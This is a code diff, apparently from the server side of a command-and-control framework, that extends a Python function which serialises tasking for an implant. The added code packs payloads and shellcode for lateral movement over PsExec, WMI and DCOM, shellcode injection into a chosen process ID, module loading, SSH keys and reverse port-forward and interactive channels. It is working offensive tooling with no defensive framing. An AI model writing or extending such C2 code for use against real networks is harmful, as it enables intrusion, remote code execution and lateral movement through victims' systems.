@@ -73,6 +73,10 @@ def pack_command_params(cmd_name, params):
         pk.add_int32(int(params.get("sleep", 0xFFFFFFFF)))
         pk.add_int32(int(params.get("jitter", 0xFFFFFFFF)))
         pk.add_int32(int(params.get("killdate", 0xFFFFFFFF)))
+        pk.add_string(params.get("spawnto_x64", ""))
+        pk.add_string(params.get("spawnto_x64_args", ""))
+        pk.add_string(params.get("spawnto_x86", ""))
+        pk.add_string(params.get("spawnto_x86_args", ""))
     elif cmd_name == "upload":
         import base64
         pk.add_string(params.get("file_id", ""))
@@ -102,6 +106,14 @@ def pack_command_params(cmd_name, params):
         if pic_b64:
             pic_raw = base64.b64decode(pic_b64)
             pk.add_bytes(pic_raw)
+        else:
+            pk.add_bytes(b"")
+    elif cmd_name == "load":
+        import base64
+        module_b64 = params.get("module_data", "")
+        if module_b64:
+            module_raw = base64.b64decode(module_b64)
+            pk.add_bytes(module_raw)
         else:
             pk.add_bytes(b"")
     elif cmd_name == "cat":
@@ -150,17 +162,42 @@ def pack_command_params(cmd_name, params):
         pk.add_string(params.get("entrypoint", "go"))
 
     elif cmd_name == "jump_psexec":
+        import base64
         pk.add_string(params.get("hostname", ""))
+        pk.add_string(params.get("filename", ""))
+        payload_b64 = params.get("payload_data", "")
+        if payload_b64:
+            pk.add_bytes(base64.b64decode(payload_b64))
+        else:
+            pk.add_bytes(b"")
         pk.add_string(params.get("service_name", "StarSvc"))
-        pk.add_string(params.get("binary_path", ""))
     elif cmd_name == "jump_scshell":
         pk.add_string(params.get("hostname", ""))
         pk.add_string(params.get("service_name", "SensSvc"))
         pk.add_string(params.get("command", ""))
     elif cmd_name == "jump_wmiexec":
+        import base64
+        pk.add_string(params.get("hostname", ""))
+        pk.add_string(params.get("filename", ""))
+        payload_b64 = params.get("payload_data", "")
+        if payload_b64:
+            pk.add_bytes(base64.b64decode(payload_b64))
+        else:
+            pk.add_bytes(b"")
+    elif cmd_name == "jump_dcomexec":
+        import base64
+        pk.add_string(params.get("hostname", ""))
+        pk.add_string(params.get("filename", ""))
+        payload_b64 = params.get("payload_data", "")
+        if payload_b64:
+            pk.add_bytes(base64.b64decode(payload_b64))
+        else:
+            pk.add_bytes(b"")
+
+    elif cmd_name == "wmiexec":
         pk.add_string(params.get("hostname", ""))
         pk.add_string(params.get("command", ""))
-    elif cmd_name == "jump_dcomexec":
+    elif cmd_name == "dcomexec":
         pk.add_string(params.get("hostname", ""))
         pk.add_string(params.get("command", ""))
 
@@ -218,9 +255,7 @@ def pack_command_params(cmd_name, params):
         pk.add_int32(int(params.get("port", 22)))
         pk.add_string(params.get("username", ""))
         pk.add_string(params.get("credential", ""))
-        pk.add_byte(1 if params.get("use_key", False) else 0)
-        pk.add_byte(0 if params.get("target_os", "linux") == "linux" else 1)
-        pk.add_string(params.get("linux_binary_b64", ""))
+        pk.add_string(params.get("key_data", ""))
 
     elif cmd_name == "rpfwd":
         pk.add_string(params.get("action", "start"))
@@ -276,10 +311,10 @@ def pack_command_params(cmd_name, params):
 
     elif cmd_name == "spawn":
         import base64
-        template_b64 = params.get("template_data", "")
-        if template_b64:
-            template_raw = base64.b64decode(template_b64)
-            pk.add_bytes(template_raw)
+        pk.add_int32(params.get("pid", 0))
+        sc_b64 = params.get("shellcode_data", "")
+        if sc_b64:
+            pk.add_bytes(base64.b64decode(sc_b64))
         else:
             pk.add_bytes(b"")
 
@@ -385,6 +420,34 @@ def pack_rpfwd_datagrams(datagrams):
     for d in datagrams:
         p.add_int32(int(d.get("server_id", 0)))
         p.add_byte(1 if d.get("exit", False) else 0)
+        data = d.get("data", "")
+        if isinstance(data, str) and data:
+            raw = base64.b64decode(data)
+        elif isinstance(data, bytes):
+            raw = data
+        else:
+            raw = b""
+        p.add_bytes(raw)
+    return p.build()
+
+
+def pack_interactive_datagrams(datagrams):
+    import base64
+    p = Packer()
+    p.add_byte(ACTION_INTERACTIVE_MSG)
+    p.add_int32(len(datagrams))
+    for d in datagrams:
+        task_id = d.get("task_id", "")
+        if isinstance(task_id, str):
+            uuid_bytes = task_id.encode("utf-8")
+        else:
+            uuid_bytes = str(task_id).encode("utf-8")
+        uuid_bytes = uuid_bytes.ljust(36, b"\x00")[:36]
+        p.data += uuid_bytes
+
+        msg_type = int(d.get("message_type", 0))
+        p.add_byte(msg_type)
+
         data = d.get("data", "")
         if isinstance(data, str) and data:
             raw = base64.b64decode(data)
